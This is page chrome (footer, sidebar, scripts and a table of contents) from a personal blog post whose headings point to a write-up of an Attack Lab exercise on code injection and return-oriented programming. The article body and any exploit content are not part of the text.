xmlns=http://www.w3.org/2000/svg><path d="M22.672 15.226l-2.432.811.841 2.515c.33 1.019-.209 2.127-1.23 2.456-1.15.325-2.148-.321-2.463-1.226l-.84-2.518-5.013 1.677.84 2.517c.391 1.203-.434 2.542-1.831 2.542-.88 0-1.601-.564-1.86-1.314l-.842-2.516-2.431.809c-1.135.328-2.145-.317-2.463-1.229-.329-1.018.211-2.127 1.231-2.456l2.432-.809-1.621-4.823-2.432.808c-1.355.384-2.558-.59-2.558-1.839 0-.817.509-1.582 1.327-1.846l2.433-.809-.842-2.515c-.33-1.02.211-2.129 1.232-2.458 1.02-.329 2.13.209 2.461 1.229l.842 2.515 5.011-1.677-.839-2.517c-.403-1.238.484-2.553 1.843-2.553.819 0 1.585.509 1.85 1.326l.841 2.517 2.431-.81c1.02-.33 2.131.211 2.461 1.229.332 1.018-.21 2.126-1.23 2.456l-2.433.809 1.622 4.823 2.433-.809c1.242-.401 2.557.484 2.557 1.838 0 .819-.51 1.583-1.328 1.847m-8.992-6.428l-5.01 1.675 1.619 4.828 5.011-1.674-1.62-4.829z"></path></svg><p>Powered by <a href=https://github.com/EveSunMaple/Frosti class=font-bold target=_blank>Frosti Template</a><br>Copyright © <a href=https://tankimzeg.top class=font-bold target=_blank>TanKimzeg</a> 2025 - All right reserved</p></aside><nav><span class=footer-title>Social</span><div class="gap-4 grid grid-flow-col"><div class=tooltip data-tip=Github><a href=https://github.com/TanKimzeg aria-label=Github tabindex=0><svg height=1em width=1em data-icon=ri:github-line class="md:text-xl text-2xl"><symbol id=ai:ri:github-line viewBox="0 0 24 24"><path d="M5.884 18.653c-.3-.2-.558-.455-.86-.816a51 51 0 0 1-.466-.579c-.463-.575-.755-.841-1.056-.95a1 1 0 1 1 .675-1.882c.752.27 1.261.735 1.947 1.588c-.094-.117.34.427.433.539c.19.227.33.365.44.438c.204.137.588.196 1.15.14c.024-.382.094-.753.202-1.095c-2.968-.726-4.648-2.64-4.648-6.396c0-1.24.37-2.356 1.058-3.292c-.218-.894-.185-1.975.302-3.192a1 1 0 0 1 .63-.582c.081-.024.127-.035.208-.047c.803-.124 1.937.17 3.415 1.096a11.7 11.7 0 0 1 2.687-.308c.912 0 1.819.104 2.684.308c1.477-.933 2.614-1.227 3.422-1.096q.128.02.218.05a1 1 0 0 1 .616.58c.487 1.216.52 2.296.302 3.19c.691.936 1.058 2.045 1.058 3.293c0 3.757-1.674 5.665-4.642 6.392c.125.415.19.878.19 1.38c0 .665-.002 1.299-.007 2.01c0 .19-.002.394-.005.706a1 1 0 0 1-.018 1.958c-1.14.227-1.984-.532-1.984-1.525l.002-.447l.005-.705c.005-.707.008-1.337.008-1.997c0-.697-.184-1.152-.426-1.361c-.661-.57-.326-1.654.541-1.751c2.966-.333 4.336-1.482 4.336-4.66c0-.955-.312-1.744-.913-2.404A1 1 0 0 1 17.2 6.19c.166-.414.236-.957.095-1.614l-.01.003c-.491.139-1.11.44-1.858.949a1 1 0 0 1-.833.135a9.6 9.6 0 0 0-2.592-.349c-.89 0-1.772.118-2.592.35a1 1 0 0 1-.829-.134c-.753-.507-1.374-.807-1.87-.947c-.143.653-.072 1.194.093 1.607a1 1 0 0 1-.189 1.045c-.597.655-.913 1.458-.913 2.404c0 3.172 1.371 4.328 4.322 4.66c.865.097 1.202 1.177.545 1.748c-.193.168-.43.732-.43 1.364v3.15c0 .985-.834 1.725-1.96 1.528a1 1 0 0 1-.04-1.962v-.99c-.91.061-1.661-.088-2.254-.485" fill=currentColor /></symbol><use href=#ai:ri:github-line></use></svg></a></div><div class=tooltip data-tip=Zhihu><a href=https://www.zhihu.com/people/Dalekov aria-label=Zhihu tabindex=0><svg height=1em width=1em data-icon=ri:zhihu-line class="md:text-xl text-2xl"><symbol id=ai:ri:zhihu-line viewBox="0 0 24 24"><path d="m12.345 17.963l-1.688 1.074l-2.132-3.35c-.44 1.402-1.171 2.665-2.138 3.825c-.402.483-.82.918-1.301 1.376c-.155.146-.775.716-.878.82l-1.414-1.415c.139-.139.787-.735.914-.856c.43-.408.796-.79 1.143-1.205C6.117 16.712 6.88 15.02 6.988 13H3v-2h4V7h-.868c-.689 1.266-1.558 2.222-2.618 2.858L2.486 8.143c1.396-.838 2.426-2.603 3.039-5.36l1.952.434q-.21.95-.489 1.783h4.513v2H9v4h2.5v2H9.186zm3.838-.07L17.3 17h1.702V7h-4v10h.736zM13.001 5h8v14h-3l-2.5 2l-1-2H13z" fill=currentColor /></symbol><use href=#ai:ri:zhihu-line></use></svg></a></div><div class=tooltip data-tip=BiliBili><a href=https://space.bilibili.com/3493121543375815 aria-label=BiliBili tabindex=0><svg height=1em width=1em data-icon=ri:bilibili-line class="md:text-xl text-2xl"><symbol id=ai:ri:bilibili-line viewBox="0 0 24 24"><path d="M7.172 2.757L10.414 6h3.171l3.243-3.242a1 1 0 1 1 1.415 1.415L16.414 6H18.5A3.5 3.5 0 0 1 22 9.5v8a3.5 3.5 0 0 1-3.5 3.5h-13A3.5 3.5 0 0 1 2 17.5v-8A3.5 3.5 0 0 1 5.5 6h2.085L5.757 4.171a1 1 0 0 1 1.415-1.415M18.5 8h-13a1.5 1.5 0 0 0-1.493 1.356L4 9.5v8a1.5 1.5 0 0 0 1.356 1.493L5.5 19h13a1.5 1.5 0 0 0 1.493-1.355L20 17.5v-8A1.5 1.5 0 0 0 18.5 8M8 11a1 1 0 0 1 1 1v2a1 1 0 1 1-2 0v-2a1 1 0 0 1 1-1m8 0a1 1 0 0 1 1 1v2a1 1 0 1 1-2 0v-2a1 1 0 0 1 1-1" fill=currentColor /></symbol><use href=#ai:ri:bilibili-line></use></svg></a></div><div class=tooltip data-tip="RSS Feed"><a href=/rss.xml aria-label="RSS Feed" tabindex=0><svg height=1em width=1em data-icon=ri:rss-line class="md:text-xl text-2xl"><symbol id=ai:ri:rss-line viewBox="0 0 24 24"><path d="M3 17a4 4 0 0 1 4 4H3zm0-7c6.075 0 11 4.925 11 11h-2a9 9 0 0 0-9-9zm0-7c9.941 0 18 8.059 18 18h-2c0-8.837-7.163-16-16-16z" fill=currentColor /></symbol><use href=#ai:ri:rss-line></use></svg></a></div></div></nav></footer></main><aside class="md:top-4 bg-transparent col-span-1 md:order-1 order-2"><div class="relative mb-4"><div class="w-full bg-base-100 shadow-lg rounded-xl"><div class="flex relative flex-col p-4"><div class="flex justify-center p-2"><img decoding=async fetchpriority=auto height=250 loading=eager src=/profile.jpg width=250 alt=Profile class="mask mask-circle"></div><ul class="items-center bg-transparent flex-col hidden lg:items-start m-0 md:flex menu p-0 w-full"><li class="relative w-full group"><a href=/ class="flex items-center rounded-lg hover:bg-base-200 font-bold justify-center lg:justify-start lg:text-xl md:text-3xl p-4 text-center text-xl" target=_self aria-label=Home tabindex=0 id=home><svg height=1em width=1em data-icon=material-symbols:home-outline-rounded viewBox="0 0 24 24"><use href=#ai:material-symbols:home-outline-rounded></use></svg> <span class="hidden lg:inline ml-2">Home</span></a></li><li class="relative w-full group"><a href=/about class="flex items-center rounded-lg hover:bg-base-200 font-bold justify-center lg:justify-start lg:text-xl md:text-3xl p-4 text-center text-xl" target=_self aria-label=About tabindex=0 id=about><svg height=1em width=1em data-icon=material-symbols:info-outline-rounded viewBox="0 0 24 24"><use href=#ai:material-symbols:info-outline-rounded></use></svg> <span class="hidden lg:inline ml-2">About</span></a></li><li class="relative w-full group"><details open class="w-full menu-item" data-submenu-id=blog><summary class="items-center rounded-lg hover:bg-base-200 font-bold justify-center lg:justify-start lg:text-xl md:text-3xl p-4 text-center text-xl"><svg height=1em width=1em data-icon=material-symbols:book-2-outline-rounded viewBox="0 0 24 24"><use href=#ai:material-symbols:book-2-outline-rounded></use></svg> <span class="hidden lg:inline ml-2">Blogs</span></summary><ul class=rounded-lg><li class=relative><a href=/blog class="p-2 hover:bg-base-200 rounded-lg font-bold lg:text-base md:text-2xl menu-item text-base" target=_self aria-label="All blogs" tabindex=0 id=header-all><svg height=1em width=1em data-icon=material-symbols:ink-pen-outline-rounded viewBox="0 0 24 24"><use href=#ai:material-symbols:ink-pen-outline-rounded></use></svg> <span class="hidden lg:inline ml-2">All blogs</span></a></li><li class=relative><a href=/blog/category/tech class="p-2 hover:bg-base-200 rounded-lg font-bold lg:text-base md:text-2xl menu-item text-base" target=_self aria-label="Tech Blogs" tabindex=0 id=header-tech><svg height=1em width=1em data-icon=material-symbols:deployed-code-outline viewBox="0 0 24 24"><use href=#ai:material-symbols:deployed-code-outline></use></svg> <span class="hidden lg:inline ml-2">Tech Blogs</span></a></li><li class=relative><a href=/blog/category/life class="p-2 hover:bg-base-200 rounded-lg font-bold lg:text-base md:text-2xl menu-item text-base" target=_self aria-label="Life Blogs" tabindex=0 id=header-life><svg height=1em width=1em data-icon=material-symbols:earthquake-rounded viewBox="0 0 24 24"><use href=#ai:material-symbols:earthquake-rounded></use></svg> <span class="hidden lg:inline ml-2">Life Blogs</span></a></li></ul></details></li><li class="relative w-full group"><a href=/project class="flex items-center rounded-lg hover:bg-base-200 font-bold justify-center lg:justify-start lg:text-xl md:text-3xl p-4 text-center text-xl" target=_self aria-label=Project tabindex=0 id=project><svg height=1em width=1em data-icon=material-symbols:code-blocks-outline viewBox="0 0 24 24"><use href=#ai:material-symbols:code-blocks-outline></use></svg> <span class="hidden lg:inline ml-2">Project</span></a></li><li class="relative w-full group"><a href=/friend class="flex items-center rounded-lg hover:bg-base-200 font-bold justify-center lg:justify-start lg:text-xl md:text-3xl p-4 text-center text-xl" target=_self aria-label=Friend tabindex=0 id=friend><svg height=1em width=1em data-icon=material-symbols:supervisor-account-outline-rounded viewBox="0 0 24 24"><use href=#ai:material-symbols:supervisor-account-outline-rounded></use></svg> <span class="hidden lg:inline ml-2">Friend</span></a></li></ul><div class="mt-4 border-base-content/20 border-t pt-3"><div class="justify-items-center gap-2 grid grid-cols-4 lg:grid-cols-4 md:grid-cols-2"><div class="tooltip tooltip-bottom" data-tip=Github><a href=https://github.com/TanKimzeg class="btn btn-circle btn-ghost" target=_blank aria-label=Github tabindex=0><svg height=1em width=1em data-icon=ri:github-line class=text-xl viewBox="0 0 24 24"><use href=#ai:ri:github-line></use></svg></a></div><div class="tooltip tooltip-bottom" data-tip=Zhihu><a href=https://www.zhihu.com/people/Dalekov class="btn btn-circle btn-ghost" target=_blank aria-label=Zhihu tabindex=0><svg height=1em width=1em data-icon=ri:zhihu-line class=text-xl viewBox="0 0 24 24"><use href=#ai:ri:zhihu-line></use></svg></a></div><div class="tooltip tooltip-bottom" data-tip=BiliBili><a href=https://space.bilibili.com/3493121543375815 class="btn btn-circle btn-ghost" target=_blank aria-label=BiliBili tabindex=0><svg height=1em width=1em data-icon=ri:bilibili-line class=text-xl viewBox="0 0 24 24"><use href=#ai:ri:bilibili-line></use></svg></a></div><div class="tooltip tooltip-bottom" data-tip="RSS Feed"><a href=https://tankimzeg.top/rss.xml class="btn btn-circle btn-ghost" target=_blank aria-label="RSS Feed" tabindex=0><svg height=1em width=1em data-icon=ri:rss-line class=text-xl viewBox="0 0 24 24"><use href=#ai:ri:rss-line></use></svg></a></div></div></div></div></div></div><div class="relative mb-4"><div class="w-full bg-base-100 shadow-lg rounded-xl"><div class=p-4><form method=get class="relative w-full" action=/blog/search><div class="relative w-full search-container"><input type=text aria-label=Search class="w-full input input-bordered pl-10 pr-16 py-2" name=q placeholder=Search><div class="flex items-center absolute inset-y-0 left-0 pl-3 pointer-events-none"><svg height=1em width=1em data-icon=lucide:search class="h-5 w-5"><symbol id=ai:lucide:search viewBox="0 0 24 24"><g fill=none stroke=currentColor stroke-linecap=round stroke-linejoin=round stroke-width=2><path d="m21 21l-4.34-4.34"/><circle cx=11 cy=11 r=8 /></g></symbol><use href=#ai:lucide:search></use></svg></div><button class="p-2 -translate-y-1/2 absolute right-2 top-1/2 transform" aria-label=Search type=submit><svg height=1em width=1em data-icon=lucide:arrow-right class="h-4 w-4"><symbol id=ai:lucide:arrow-right viewBox="0 0 24 24"><path d="M5 12h14m-7-7l7 7l-7 7" fill=none stroke=currentColor stroke-linecap=round stroke-linejoin=round stroke-width=2 /></symbol><use href=#ai:lucide:arrow-right></use></svg></button></div></form></div></div><script type=module>document.addEventListener("keydown",(e=>{const t=e.target;if("/"===e.key&&t&&"INPUT"!==t.tagName&&"TEXTAREA"!==t.tagName){e.preventDefault();const t=document.querySelector('input[name="q"]');t&&t.focus()}}))</script></div><div class="md:top-4 md:sticky"><div class="w-full bg-base-100 shadow-lg rounded-xl"><div class="toolbar-container p-4"><div class="items-center justify-center flex-wrap gap-4 grid grid-cols-4 lg:grid-cols-4 md:grid-cols-2"><a href=/blog/tags class="btn btn-circle hover:scale-110 bg-base-100 btn-md shadow-sm border-base-content/20" aria-label=Tag title=Tag><svg height=1em width=1em data-icon=lucide:tag class="h-5 w-5"><symbol id=ai:lucide:tag viewBox="0 0 24 24"><g fill=none stroke=currentColor stroke-linecap=round stroke-linejoin=round stroke-width=2><path d="M12.586 2.586A2 2 0 0 0 11.172 2H4a2 2 0 0 0-2 2v7.172a2 2 0 0 0 .586 1.414l8.704 8.704a2.426 2.426 0 0 0 3.42 0l6.58-6.58a2.426 2.426 0 0 0 0-3.42z"/><circle cx=7.5 cy=7.5 r=.5 fill=currentColor /></g></symbol><use href=#ai:lucide:tag></use></svg> </a><a href=/blog/categories class="btn btn-circle hover:scale-110 bg-base-100 btn-md shadow-sm border-base-content/20" aria-label=Category title=Category><svg height=1em width=1em data-icon=lucide:folder class="h-5 w-5"><symbol id=ai:lucide:folder viewBox="0 0 24 24"><path d="M20 20a2 2 0 0 0 2-2V8a2 2 0 0 0-2-2h-7.9a2 2 0 0 1-1.69-.9L9.6 3.9A2 2 0 0 0 7.93 3H4a2 2 0 0 0-2 2v13a2 2 0 0 0 2 2Z" fill=none stroke=currentColor stroke-linecap=round stroke-linejoin=round stroke-width=2 /></symbol><use href=#ai:lucide:folder></use></svg> </a><a href=/blog/archives class="btn btn-circle hover:scale-110 bg-base-100 btn-md shadow-sm border-base-content/20" aria-label=Archives title=Archives><svg height=1em width=1em data-icon=lucide:archive class="h-5 w-5"><symbol id=ai:lucide:archive viewBox="0 0 24 24"><g fill=none stroke=currentColor stroke-linecap=round stroke-linejoin=round stroke-width=2><rect height=5 rx=1 width=20 x=2 y=3 /><path d="M4 8v11a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8m-10 4h4"/></g></symbol><use href=#ai:lucide:archive></use></svg> </a><button title="Theme Toggle" aria-label="Toggle theme" class="btn btn-circle hover:scale-110 bg-base-100 btn-md shadow-sm md:border-base-content/20 sidebar-theme" data-astro-cid-mjqc4hpp data-theme-toggle id=theme-toggle-uvnmlnge1><svg height=1em width=1em data-icon=lucide:sun class="h-5 w-5 theme-toggle-icon sun-icon" viewBox="0 0 24 24" data-astro-cid-mjqc4hpp=true><use href=#ai:lucide:sun></use></svg> <svg height=1em width=1em data-icon=lucide:moon class="h-5 w-5 theme-toggle-icon hidden moon-icon" viewBox="0 0 24 24" data-astro-cid-mjqc4hpp=true><use href=#ai:lucide:moon></use></svg></button><script>!function(){const e="winter",t="dracula",n=(e,t)=>{if(!e)return;const n=e.querySelector(".sun-icon"),d=e.querySelector(".moon-icon");n&&d&&(t?(n.classList.remove("hidden"),d.classList.add("hidden")):(n.classList.add("hidden"),d.classList.remove("hidden")))};document.addEventListener("astro:page-load",(()=>{const d=document.getElementById("theme-toggle-uvnmlnge1");if(!d)return;const o=document.documentElement.getAttribute("data-theme");n(d,o===t),d.addEventListener("click",(()=>{const o=document.documentElement.getAttribute("data-theme")===e?t:e;d.classList.add("animate-spin-once"),document.documentElement.setAttribute("data-theme",o);const c=o===t?"dark":"light";document.documentElement.setAttribute("data-theme-type",c),localStorage.setItem("theme",o);document.querySelectorAll("[data-theme-toggle]").forEach((e=>{n(e,o===t)})),setTimeout((()=>{d.classList.remove("animate-spin-once")}),300)}))}))}()</script></div></div></div><button class="btn btn-circle hover:scale-110 bg-base-100 btn-md fixed invisible opacity-0 right-6 shadow-lg transition-all z-50 bottom-6" aria-label="Scroll to top" id=scroll-to-top><svg height=1em width=1em data-icon=material-symbols:arrow-upward-rounded class="h-5 w-5"><symbol id=ai:material-symbols:arrow-upward-rounded viewBox="0 0 24 24"><path d="m11 7.825l-4.9 4.9q-.3.3-.7.288t-.7-.313q-.275-.3-.288-.7t.288-.7l6.6-6.6q.15-.15.325-.212T12 4.425t.375.063t.325.212l6.6 6.6q.275.275.275.688t-.275.712q-.3.3-.712.3t-.713-.3L13 7.825V19q0 .425-.288.713T12 20t-.712-.288T11 19z" fill=currentColor /></symbol><use href=#ai:material-symbols:arrow-upward-rounded></use></svg></button><script type=module>document.addEventListener("astro:page-load",(()=>{const i=document.getElementById("scroll-to-top");if(i){const s=()=>{window.scrollY>300?(i.classList.remove("opacity-0","invisible"),i.classList.add("opacity-100","visible")):(i.classList.remove("opacity-100","visible"),i.classList.add("opacity-0","invisible"))};s(),window.addEventListener("scroll",s),i.addEventListener("click",(()=>{window.scrollTo({top:0,behavior:"smooth"})}))}}))</script><div class="mt-4 md:max-h-[calc(100vh-2rem)] z-10" id=toc-container data-astro-cid-ydxbofl4><div class="w-full bg-base-100 shadow-lg rounded-xl"><div class=p-4 data-astro-cid-ydxbofl4><nav class="relative max-h-[calc(100vh-200px)] overflow-y-auto scrollbar-none toc-nav" data-astro-cid-ydxbofl4><div class="bg-primary/10 absolute opacity-0 pointer-events-none rounded-lg shadow-sm z-0" id=active-indicator data-astro-cid-ydxbofl4></div><ul class="relative space-y-0 z-10" data-astro-cid-ydxbofl4><li data-astro-cid-ydxbofl4><a href=#heading-0 class="flex items-center rounded-lg px-2 py-2 relative toc-link font-medium" style=padding-left:12px data-astro-cid-ydxbofl4 data-heading-depth=1 data-heading-slug=介绍 data-index=0><svg height=1em width=1em data-icon=tabler:chevron-right class="h-4 w-4 absolute duration-200 icon-indicator left-1 opacity-0 text-primary transition-all" data-astro-cid-ydxbofl4=true><symbol id=ai:tabler:chevron-right viewBox="0 0 24 24"><path d="m9 6l6 6l-6 6" fill=none stroke=currentColor stroke-linecap=round stroke-linejoin=round stroke-width=2 /></symbol><use href=#ai:tabler:chevron-right></use></svg><span class="duration-200 link-text transition-transform" data-astro-cid-ydxbofl4>介绍</span></a></li><li data-astro-cid-ydxbofl4><a href=#heading-1 class="flex items-center rounded-lg px-2 py-2 relative toc-link" style=padding-left:28px data-astro-cid-ydxbofl4 data-heading-depth=2 data-heading-slug=rop举例 data-index=1><svg height=1em width=1em data-icon=tabler:chevron-right class="h-4 w-4 absolute duration-200 icon-indicator left-1 opacity-0 text-primary transition-all" viewBox="0 0 24 24" data-astro-cid-ydxbofl4=true><use href=#ai:tabler:chevron-right></use></svg><span class="duration-200 link-text transition-transform" data-astro-cid-ydxbofl4>ROP举例</span></a></li><li data-astro-cid-ydxbofl4><a href=#heading-2 class="flex items-center rounded-lg px-2 py-2 relative toc-link font-medium" style=padding-left:12px data-astro-cid-ydxbofl4 data-heading-depth=1 data-heading-slug=工具 data-index=2><svg height=1em width=1em data-icon=tabler:chevron-right class="h-4 w-4 absolute duration-200 icon-indicator left-1 opacity-0 text-primary transition-all" viewBox="0 0 24 24" data-astro-cid-ydxbofl4=true><use href=#ai:tabler:chevron-right></use></svg><span class="duration-200 link-text transition-transform" data-astro-cid-ydxbofl4>工具</span></a></li><li data-astro-cid-ydxbofl4><a href=#heading-3 class="flex items-center rounded-lg px-2 py-2 relative toc-link" style=padding-left:28px data-astro-cid-ydxbofl4 data-heading-depth=2 data-heading-slug=objdump data-index=3><svg height=1em width=1em data-icon=tabler:chevron-right class="h-4 w-4 absolute duration-200 icon-indicator left-1 opacity-0 text-primary transition-all" viewBox="0 0 24 24" data-astro-cid-ydxbofl4=true><use href=#ai:tabler:chevron-right></use></svg><span class="duration-200 link-text transition-transform" data-astro-cid-ydxbofl4>objdump</span></a></li><li data-astro-cid-ydxbofl4><a href=#heading-4 class="flex items-center rounded-lg px-2 py-2 relative toc-link" style=padding-left:28px data-astro-cid-ydxbofl4 data-heading-depth=2 data-heading-slug=hex2raw data-index=4><svg height=1em width=1em data-icon=tabler:chevron-right class="h-4 w-4 absolute duration-200 icon-indicator left-1 opacity-0 text-primary transition-all" viewBox="0 0 24 24" data-astro-cid-ydxbofl4=true><use href=#ai:tabler:chevron-right></use></svg><span class="duration-200 link-text transition-transform" data-astro-cid-ydxbofl4>hex2raw</span></a></li><li data-astro-cid-ydxbofl4><a href=#heading-5 class="flex items-center rounded-lg px-2 py-2 relative toc-link" style=padding-left:28px data-astro-cid-ydxbofl4 data-heading-depth=2 data-heading-slug=gdb data-index=5><svg height=1em width=1em data-icon=tabler:chevron-right class="h-4 w-4 absolute duration-200 icon-indicator left-1 opacity-0 text-primary transition-all" viewBox="0 0 24 24" data-astro-cid-ydxbofl4=true><use href=#ai:tabler:chevron-right></use></svg><span class="duration-200 link-text transition-transform" data-astro-cid-ydxbofl4>GDB</span></a></li><li data-astro-cid-ydxbofl4><a href=#heading-6 class="flex items-center rounded-lg px-2 py-2 relative toc-link font-medium" style=padding-left:12px data-astro-cid-ydxbofl4 data-heading-depth=1 data-heading-slug=ctargetcode-injection-attacks data-index=6><svg height=1em width=1em data-icon=tabler:chevron-right class="h-4 w-4 absolute duration-200 icon-indicator left-1 opacity-0 text-primary transition-all" viewBox="0 0 24 24" data-astro-cid-ydxbofl4=true><use href=#ai:tabler:chevron-right></use></svg><span class="duration-200 link-text transition-transform" data-astro-cid-ydxbofl4>ctarget:Code Injection Attacks</span></a></li><li data-astro-cid-ydxbofl4><a href=#heading-7 class="flex items-center rounded-lg px-2 py-2 relative toc-link" style=padding-left:28px data-astro-cid-ydxbofl4 data-heading-depth=2 data-heading-slug=phase-1 data-index=7><svg height=1em width=1em data-icon=tabler:chevron-right class="h-4 w-4 absolute duration-200 icon-indicator left-1 opacity-0 text-primary transition-all" viewBox="0 0 24 24" data-astro-cid-ydxbofl4=true><use href=#ai:tabler:chevron-right></use></svg><span class="duration-200 link-text transition-transform" data-astro-cid-ydxbofl4>Phase 1</span></a></li><li data-astro-cid-ydxbofl4><a href=#heading-8 class="flex items-center rounded-lg px-2 py-2 relative toc-link" style=padding-left:28px data-astro-cid-ydxbofl4 data-heading-depth=2 data-heading-slug=phase-2 data-index=8><svg height=1em width=1em data-icon=tabler:chevron-right class="h-4 w-4 absolute duration-200 icon-indicator left-1 opacity-0 text-primary transition-all" viewBox="0 0 24 24" data-astro-cid-ydxbofl4=true><use href=#ai:tabler:chevron-right></use></svg><span class="duration-200 link-text transition-transform" data-astro-cid-ydxbofl4>Phase 2</span></a></li><li data-astro-cid-ydxbofl4><a href=#heading-9 class="flex items-center rounded-lg px-2 py-2 relative toc-link" style=padding-left:28px data-astro-cid-ydxbofl4 data-heading-depth=2 data-heading-slug=phase-3 data-index=9><svg height=1em width=1em data-icon=tabler:chevron-right class="h-4 w-4 absolute duration-200 icon-indicator left-1 opacity-0 text-primary transition-all" viewBox="0 0 24 24" data-astro-cid-ydxbofl4=true><use href=#ai:tabler:chevron-right></use></svg><span class="duration-200 link-text transition-transform" data-astro-cid-ydxbofl4>Phase 3</span></a></li><li data-astro-cid-ydxbofl4><a href=#heading-10 class="flex items-center rounded-lg px-2 py-2 relative toc-link font-medium" style=padding-left:12px data-astro-cid-ydxbofl4 data-heading-depth=1 data-heading-slug=rtagetreturn-oriented-programming data-index=10><svg height=1em width=1em data-icon=tabler:chevron-right class="h-4 w-4 absolute duration-200 icon-indicator left-1 opacity-0 text-primary transition-all" viewBox="0 0 24 24" data-astro-cid-ydxbofl4=true><use href=#ai:tabler:chevron-right></use></svg><span class="duration-200 link-text transition-transform" data-astro-cid-ydxbofl4>rtaget:Return-Oriented Programming</span></a></li><li data-astro-cid-ydxbofl4><a href=#heading-11 class="flex items-center rounded-lg px-2 py-2 relative toc-link" style=padding-left:28px data-astro-cid-ydxbofl4 data-heading-depth=2 data-heading-slug=phase-4 data-index=11><svg height=1em width=1em data-icon=tabler:chevron-right class="h-4 w-4 absolute duration-200 icon-indicator left-1 opacity-0 text-primary transition-all" viewBox="0 0 24 24" data-astro-cid-ydxbofl4=true><use href=#ai:tabler:chevron-right></use></svg><span class="duration-200 link-text transition-transform" data-astro-cid-ydxbofl4>Phase 4</span></a></li><li data-astro-cid-ydxbofl4><a href=#heading-12 class="flex items-center rounded-lg px-2 py-2 relative toc-link" style=padding-left:28px data-astro-cid-ydxbofl4 data-heading-depth=2 data-heading-slug=phase-5 data-index=12><svg height=1em width=1em data-icon=tabler:chevron-right class="h-4 w-4 absolute duration-200 icon-indicator left-1 opacity-0 text-primary transition-all" viewBox="0 0 24 24" data-astro-cid-ydxbofl4=true><use href=#ai:tabler:chevron-right></use></svg><span class="duration-200 link-text transition-transform" data-astro-cid-ydxbofl4>Phase 5</span></a></li><li data-astro-cid-ydxbofl4><a href=#heading-13 class="flex items-center rounded-lg px-2 py-2 relative toc-link font-medium" style=padding-left:12px data-astro-cid-ydxbofl4 data-heading-depth=1 data-heading-slug=总结 data-index=13><svg height=1em width=1em data-icon=tabler:chevron-right class="h-4 w-4 absolute duration-200 icon-indicator left-1 opacity-0 text-primary transition-all" viewBox="0 0 24 24" data-astro-cid-ydxbofl4=true><use href=#ai:tabler:chevron-right></use></svg><span class="duration-200 link-text transition-transform" data-astro-cid-ydxbofl4>总结</span></a></li></ul></nav></div></div></div><script type=module>document.addEventListener("astro:page-load",(()=>{const t=document.querySelector(".toc-nav"),e=document.getElementById("active-indicator"),n=Array.from(document.querySelectorAll(".toc-nav a"));if(!t||!e||0===n.length)return;const o=document.querySelectorAll("h1[id], h2[id], h3[id], h4[id], h5[id], h6[id]");if(0===o.length)return;let i=null,r=!1,s=null;const c=new Map;function a(t,n=!0){if(!t)return;const o=parseInt(t.getAttribute("data-heading-depth")||"1");e.style.transition=n?"all 0.3s cubic-bezier(0.25, 0.1, 0.25, 1)":"opacity 0.3s ease-in-out",requestAnimationFrame((()=>{e.style.top=`${t.offsetTop}px`,e.style.height=`${t.offsetHeight}px`,e.style.opacity="1",e.style.left=16*(o-1)+"px",e.style.width=`calc(100% - ${16*(o-1)}px)`}))}function u(t,e){const n=t.getBoundingClientRect(),o=e.getBoundingClientRect();return n.top>=o.top&&n.bottom<=o.bottom}function l(e){i!==e&&(i&&i.classList.remove("active"),e.classList.add("active"),i=e,a(e),u(e,t)||function(e){if(u(e,t))return;const n=e.offsetTop,o=t.clientHeight,i=Math.max(0,n-o/2+e.offsetHeight/2);t.scrollTo({top:i,behavior:"smooth"})}(e))}o.forEach(((t,e)=>{const n=t.getAttribute("id"),o=`heading-${e}`;n&&n!==o&&(t.setAttribute("id",o),c.set(n,o),document.querySelectorAll(`a[href="#${n}"]:not(.toc-nav a)`).forEach((t=>t.setAttribute("href",`#${o}`))))})),t.addEventListener("click",(t=>{const e=t.target.closest("a");if(!e)return;t.preventDefault();const n=e.getAttribute("href")||"";if(!n||!n.startsWith("#"))return;const o=n.substring(1),i=document.getElementById(o);i&&(r=!0,l(e),i.scrollIntoView({behavior:"smooth"}),history.pushState(null,"",n),setTimeout((()=>{r=!1}),1e3))})),window.addEventListener("resize",(()=>{s&&clearTimeout(s),s=window.setTimeout((()=>{i&&a(i,!1)}),100)}),{passive:!0});const d=new IntersectionObserver((t=>{if(r)return;const e=t.filter((t=>t.isIntersecting));if(0===e.length)return;let n=e[0],o=1/0;for(const t of e){const e=Math.abs(t.boundingClientRect.top);e<o&&(o=e,n=t)}const s=n.target.getAttribute("id");if(!s)return;const c=document.querySelector(`.toc-nav a[href="#${s}"]`);c&&c!==i&&l(c)}),{rootMargin:"-50px 0px -75% 0px",threshold:[0,.25]});o.forEach((t=>d.observe(t))),setTimeout((()=>{const t=window.location.hash.substring(1),e=t?document.getElementById(t):o[0];if(e){const t=e.getAttribute("id");if(!t)return;const n=document.querySelector(`.toc-nav a[href="#${t}"]`);n&&l(n)}}),200),window.addEventListener("hashchange",(()=>{if(r)return;const t=window.location.hash.substring(1);if(t){if(r=!0,document.getElementById(t)){const e=document.querySelector(`.toc-nav a[href="#${t}"]`);e&&l(e)}setTimeout((()=>{r=!1}),1e3)}}))}))</script></div></aside></div></div><button class="btn btn-circle hover:scale-110 bg-base-100 btn-md fixed invisible opacity-0 right-6 shadow-lg transition-all z-50 bottom-20 md:hidden" aria-label="Table of Contents" id=mobile-toc-button onclick=mobile_toc_modal.showModal()><svg height=1em width=1em data-icon=lucide:list class="h-5 w-5"><symbol id=ai:lucide:list viewBox="0 0 24 24"><path d="M3 5h.01M3 12h.01M3 19h.01M8 5h13M8 12h13M8 19h13" fill=none stroke=currentColor stroke-linecap=round stroke-linejoin=round stroke-width=2 /></symbol><use href=#ai:lucide:list></use></svg></button><dialog class="modal md:hidden" id=mobile_toc_modal><div class="bg-base-100 max-w-md modal-box rounded-lg shadow-xl w-10/12"><div class="flex items-center border-b border-base-200 justify-between pb-4"><h3 class=font-medium>Table of Contents</h3><form method=dialog><button class="btn btn-circle btn-ghost" aria-label="Table of Contents"><svg height=1em width=1em data-icon=lucide:x class="h-5 w-5" viewBox="0 0 24 24"><use href=#ai:lucide:x></use></svg></button></form></div><div class="max-h-[70vh] overflow-auto pt-4"><ul class="menu-sm menu"><li class=my-1><a href=#介绍 class="flex items-center rounded-lg hover:bg-base-200 mobile-toc-link transition-color" style=margin-left:0 data-mobile-heading-id=介绍><span class="text-sm truncate">介绍</span></a></li><li class=my-1><a href=#rop举例 class="flex items-center rounded-lg hover:bg-base-200 mobile-toc-link transition-color" style=margin-left:12px data-mobile-heading-id=rop举例><span class="text-sm truncate">ROP举例</span></a></li><li class=my-1><a href=#工具 class="flex items-center rounded-lg hover:bg-base-200 